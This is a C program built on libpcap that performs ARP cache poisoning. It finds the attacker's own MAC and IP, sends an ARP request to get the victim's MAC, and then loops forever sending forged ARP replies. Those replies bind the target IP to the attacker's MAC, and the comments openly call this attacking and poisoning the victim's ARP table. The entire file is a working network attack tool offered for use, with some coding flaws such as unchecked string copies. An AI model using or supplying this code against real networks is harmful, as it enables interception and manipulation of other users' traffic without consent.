  #include <stdio.h>
  #include <string.h>
  #include <stdlib.h>
  #include <pcap.h>
  #include <linux/if_ether.h>
  #include <linux/ip.h>
  #include <linux/icmp.h>
  #include <arpa/inet.h>
  #include <pcap/pcap.h> 

  #include <sys/ioctl.h>
  #include <net/if.h>

  #define PCAP_CNT_MAX 10
  #define PCAP_SNAPSHOT 1024
  #define PCAP_TIMEOUT 100
  #define FILTER_RULE "arp"


struct arphdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
};

  uint8_t tmac[6];
  unsigned char *mac;
  unsigned char *attacker_ip;
  unsigned char sender_ip[20];
  unsigned char target_ip[20];
  
  void packet_view(unsigned char *, const struct pcap_pkthdr *, const unsigned char *);
        
  int main(int argc, char *argv[]) {
  
                char *dev;
                char errbuf[PCAP_ERRBUF_SIZE];
                bpf_u_int32 net;
                bpf_u_int32 netmask;
                struct in_addr net_addr, mask_addr;
                pcap_t *pd;
		struct bpf_program fcode;
		struct ifreq ifr, ifr2;
		int fd;
		unsigned char packet[65535];
		struct arphdr *arphdr;
	
		if (argc<4) {
			printf("%s <interface> <sender_ip> <target_ip>\n",argv[0]);
			exit(0);
		}

		if(!(dev = pcap_lookupdev(errbuf))) {
                        perror(errbuf);
                        exit(1);
                }

                if(pcap_lookupnet(dev, &net, &netmask, errbuf) < 0) {
                        perror(errbuf);
                        exit(1);
                }

		if((pd = pcap_open_live(dev, PCAP_SNAPSHOT, 1, PCAP_TIMEOUT, errbuf)) == NULL) {
                        perror(errbuf);
                        exit(1);
                }

		// get attacker's mac address

		fd=socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
		strcpy(ifr.ifr_name,argv[1]);
		strcpy(sender_ip,argv[2]);
		strcpy(target_ip,argv[3]);

		if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {

	        mac = (unsigned char *) ifr.ifr_hwaddr.sa_data;
                printf("[DEBUG] %02x:%02x:%02x:%02x:%02x:%02x\n", mac[0],mac[1],mac[2],
                     mac[3],mac[4],mac[5]);
		}

		// get attacker's ip address
	        ioctl(fd, SIOCGIFADDR, &ifr2);
		attacker_ip=inet_ntoa(((struct sockaddr_in *) &ifr2.ifr_addr)->sin_addr);

		// make arp request frame to get victim's mac address
		arphdr = (struct arphdr *) (packet+14);	
		arphdr->htype = htons(1);
		arphdr->ptype = htons(0x0800);
		arphdr->hlen = 6;
		arphdr->plen = 4;
		arphdr->opcode = htons(1);
		
		memcpy(arphdr-> sender_mac,mac,6);
		inet_pton(AF_INET, attacker_ip, arphdr->sender_ip);
		inet_pton(AF_INET, sender_ip, arphdr->target_ip);
		memset(arphdr->target_mac,0,6);

		// broadercast arp 
		memcpy(packet, "\xff\xff\xff\xff\xff\xff",6);
		memcpy(packet+6, mac,6);
		memcpy(packet+12,"\x08",1);
		memcpy(packet+13,"\x06",1);

		int j;
		for (j=0;j<42;j++) printf("[%02x]", packet[j]);
		printf("\n");

		// packet sending
		pcap_sendpacket(pd, packet, 42);

                if(pcap_compile(pd, &fcode, FILTER_RULE, 0, netmask) < 0) {
                        perror(pcap_geterr(pd));
                        exit(1);
                }
                // set filtering rule
                if(pcap_setfilter(pd, &fcode) < 0) {
                        perror(pcap_geterr(pd));
                        exit(1);
                } 

		// capture 1 arp packet

                if(pcap_loop(pd, 1, packet_view, 0) < 0) {
                        perror(pcap_geterr(pd));
                        exit(1);
                }

		printf(" Attacking ...");
		int k;
		for (k=0;;k++) {

			// make arp reply frame to poison victim's arp table
			printf("+");
			arphdr -> opcode =htons(2);
			inet_pton(AF_INET, target_ip, arphdr->sender_ip);
			inet_pton(AF_INET, sender_ip, arphdr->target_ip);
		
			memcpy(arphdr->sender_mac, mac, 6);
			memcpy(arphdr->target_mac, tmac, 6);
			int l;
			for (l=0;l<6;l++) 
			{
				packet[l]=tmac[l];
			}

			 pcap_sendpacket(pd, packet, 42);
		}	
        
                pcap_close(pd);
        
                return 1;
        }

	// if packet captured..

        void packet_view(unsigned char *user, const struct pcap_pkthdr *h, const unsigned char *p)
         {
                int len;
       
		struct ethhdr *ethhdr;
		struct arphdr *arphdr;
		

		ethhdr = (struct ethhdr *) p;
		arphdr  = (struct arphdr *) (p+14);

		
		len = h->len;
		int i;
		printf("Packet \n");

		// if arp packet 
		if (ethhdr->h_proto==htons(0x0806)) {
			// if arp reply
			if (arphdr->opcode == htons(2)) 
			{	printf("arp reply \n");
				memcpy(tmac, arphdr->sender_mac,6);
				
			}
       		} 
                return ;
        }
